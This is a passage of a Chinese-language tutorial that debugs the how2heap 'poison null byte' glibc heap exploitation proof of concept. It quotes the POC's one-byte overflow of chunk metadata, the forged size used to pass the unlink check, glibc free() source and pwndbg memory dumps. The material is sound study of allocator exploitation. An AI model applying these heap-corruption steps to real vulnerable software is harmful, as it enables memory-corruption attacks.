class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line"><span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a11</span> <span class="meta">#b(malloc)</span></span><br><span class="line">    <span class="comment">//b_size_ptr==0x555555757768</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>barrier 防止在释放时堆块和 top_chunk 合并，体现了这个堆块的名字–barrier（屏障）。接下来修改堆块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x9f0) = 0xa00;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line"><span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line"><span class="comment">// we set this location to 0xa00 since 0xa00 == (0xa11 &amp; 0xff00)</span></span><br><span class="line"><span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x9f0</span>) = <span class="number">0xa00</span>;</span><br></pre></td></tr></table></figure><p>POC 注释中提到了在 glibc 后续版本中对 unlink 添加了一些检查机制，如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620020304639-b3024cef-8e59-42ac-a926-033f8a98652d.png#clientId=ucb4443ff-3664-4&from=paste&height=213&id=ub61b4991&margin=%5Bobject%20Object%5D&name=image.png&originHeight=426&originWidth=1626&originalType=binary&size=90993&status=done&style=none&taskId=u39330404-b302-48c9-9f9f-e80fceeb63b&width=813" alt="image.png"><br>可以看到，在 unlink 的代码最前面添加了对 p 和 nextchunk 的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br></pre></td></tr></table></figure><ul><li>chunksize(p)：获取 p 堆块的大小，不包含三个标志位。</li><li>prev_size(p)：获取 p 堆块的 mchunk_prev_size</li><li>next_chunk(p)：获取 p 堆块相邻高地址的堆块地址<blockquote><p>在 malloc 状态下返回的堆块指针指向堆块的起始地址</p></blockquote></li></ul><p>我们必须让 chunksize(P) == prev_size (next_chunk(P))才不会在后续的代码中触发异常，这个问题稍后再说；现在的内存如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a11</span> <span class="meta">#b(malloc)</span></span><br><span class="line">    <span class="comment">//b_size_ptr指向此处</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span></span><br><span class="line">    #*(<span class="keyword">size_t</span>*)(b+<span class="number">0x9f0</span>) = <span class="number">0xa00</span>;</span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>之后我们会将 b 堆块进行 free：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>为了能看清楚，我们这里选择引入 free 源码进行调试；由于 b 堆块的大小为 0xa11，经过一些步骤之后会来到：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620024784560-671795f3-b479-4996-80a5-a693d01e79ce.png#clientId=ucb4443ff-3664-4&from=drop&id=u96f891f7&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-03%2014.53.00.png&originHeight=108&originWidth=2078&originalType=binary&size=32359&status=done&style=none&taskId=u289766e2-ae43-4a18-89f8-62e49175d04" alt="截屏2021-05-03 14.53.00.png"></p><blockquote><p>p==0x555555757760 //p 指向要释放堆块的堆块开头</p></blockquote><p>源码中的 prev_inuse(p)==((p)-&gt;mchunk_size &amp; PREV_INUSE)==0x1，因此不会进入 if 语句，这说明 p 之前的一个堆块是处于 malloc 状态，不会触发合并。</p><blockquote><p>这里的合并的分类有向前合并和向后合并，这两个概念稍后再说。</p></blockquote><p>由于现在要释放的堆块 p 的高地址相邻的堆块不为 top_chunk，因此会进入 if 语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>先来看一下第一行代码 inuse_bit_at_offset(nextchunk, nextsize)，其中 inuse_bit_at_offset 宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure><p>很明显 inuse_bit_at_offset 是获取 p 堆块中 mchunk_size 标志位 PREV_INUSE 的值，运算结果为 nextinuse==0x1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//nextinuse=0x1,不会进入此if</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>); <span class="comment">//清除nextchunk的PREV_INUSE标志位</span></span><br><span class="line"><span class="comment">//----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//clear_inuse_bit_at_offset的宏定义如下</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757760</span></span><br><span class="line">Size: <span class="number">0xa11</span></span><br><span class="line"><span class="comment">//清除标志位后：</span></span><br><span class="line">Allocated chunk | PREV_INUSE    <span class="comment">//Allocated chunk</span></span><br><span class="line">Addr: <span class="number">0x555555758170</span><span class="comment">//Addr: 0x555555758170</span></span><br><span class="line">Size: <span class="number">0x511</span><span class="comment">//Size: 0x510</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555758680</span></span><br><span class="line">Size: <span class="number">0x111</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555758790</span></span><br><span class="line">Size: <span class="number">0x1f871</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>清除 nextchunk 标志位之后说明 p 堆块开始进入释放状态，接下来开始将 p 堆块放入 top_chunk 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av); <span class="comment">//bck==0x7ffff7dcdca0 (main_arena+96)</span></span><br><span class="line">     fwd = bck-&gt;fd; <span class="comment">//fwd==0x00007ffff7dcdca0</span></span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) <span class="comment">//fwd-&gt;bk==0x00007ffff7dcdca0</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>); <span class="comment">//检查双向链表的完整性</span></span><br><span class="line">     p-&gt;fd = fwd; <span class="comment">//设置p堆块的fd指针</span></span><br><span class="line">     p-&gt;bk = bck; <span class="comment">//设置p堆块的bk指针</span></span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size)) <span class="comment">//根据p堆块的大小按需设置fd_nextsize和bk_nextsize指针</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p; <span class="comment">//链入unsortedbin【1】</span></span><br><span class="line">     fwd-&gt;bk = p; <span class="comment">//链入unsortedbin【2】</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555757760</span> —▸ <span class="number">0x7ffff7dcdca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757760</span> <span class="comment">/* &#x27;`wuUUU&#x27; */</span></span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line">pwndbg&gt; x/<span class="number">330</span>gx <span class="number">0x555555757760</span></span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a11</span> <span class="meta">#p(unsortedbin)</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span></span><br><span class="line">    #数据由POC伪造</span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000510</span> <span class="meta">#nextchunk(malloc)</span></span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line"><span class="number">0x5555557581a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>最后设置 p 堆块的 head 和 foot：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">set_foot(p, size);</span><br><span class="line"></span><br><span class="line">check_free_chunk(av, p); <span class="comment">//对free后堆块的检查</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">330</span>gx <span class="number">0x555555757760</span></span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a11</span> <span class="meta">#p(unsortedbin)</span></span><br><span class="line">    #set_head(p, size | PREV_INUSE);</span><br><span class="line">    #数据没有变化</span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span></span><br><span class="line">    #数据由POC伪造</span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#nextchunk(malloc)</span></span><br><span class="line">    #set_foot(p, size)</span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line"><span class="number">0x5555557581a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>最终返回，结束 free，此时的内存如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a11</span> <span class="meta">#b(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">    <span class="comment">//b_size_ptr指向此处</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span></span><br><span class="line">    #*(<span class="keyword">size_t</span>*)(b+<span class="number">0x9f0</span>) = <span class="number">0xa00</span>;</span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>现在我们回到 POC 代码继续调试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0xa00 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br></pre></td></tr></table></figure><p>如上面注释所说，假如现在有一个 off-by-one（单字节溢出）漏洞可以溢出到下一个堆块的 mchunk_size，也就是说现在的 b 堆块的大小被修改为 0xa00：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a00</span> <span class="meta">#b(free-unsortedbin)</span></span><br><span class="line">    <span class="meta">#a[real_a_size] = 0</span></span><br><span class="line">    #这里原来的数据为<span class="number">0xa11</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">    <span class="comment">//b_size_ptr指向此处</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">//*(size_t*)(b+0x9f0) = 0xa00;</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>关于 0xa00 的修改有两个目的：</p><ul><li>堆块 a 被认为现在是处于“free”状态，因为 b 的 mchunk_size 中 PREV_INUSE 标志位为 0</li><li>堆块 b 现在的大小被修改为 0xa00，也就是说现在 b 堆块的可控范围从 0xa08 变为了 0x9F8：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改大小之前（处于malloc）：</span></span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a11</span> <span class="meta">#b---</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span>     ｜</span><br><span class="line">......   ｜--&gt;堆块b的可控范围：<span class="number">0xa08</span></span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span>     ｜<span class="comment">//0x8170-0x7770+0x8==0xa08</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000000</span>------------------------</span><br><span class="line">                                    <span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line"><span class="meta">#pwndbg&gt; p/t 0x0000000000000a11</span></span><br><span class="line">#$<span class="number">33</span> = <span class="number">101000010001</span></span><br><span class="line"><span class="meta">#pwndbg&gt;</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="comment">//修改大小之后（处于malloc）：</span></span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a00</span> <span class="meta">#b---</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span>     ｜</span><br><span class="line">......   ｜--&gt;堆块b的可控范围：<span class="number">0x9F8</span></span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span>------------------------ <span class="comment">//0x8160-0x7770+0x8==0x9F8</span></span><br><span class="line">    <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line"><span class="meta">#pwndbg&gt; p/t 0x0000000000000a00</span></span><br><span class="line">#$<span class="number">34</span> = <span class="number">101000000000</span></span><br><span class="line"><span class="meta">#pwndbg&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的堆块可控范围指的是堆块中user_data的大小</span></span><br></pre></td></tr></table></figure><p>接下来执行下面的代码，这两行代码没有实际作用，主要是为了查看堆块 c 的 mchunk_prev_size 方便</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line"><span class="comment">//*c_prev_size_ptr==0xa10</span></span><br><span class="line">......</span><br><span 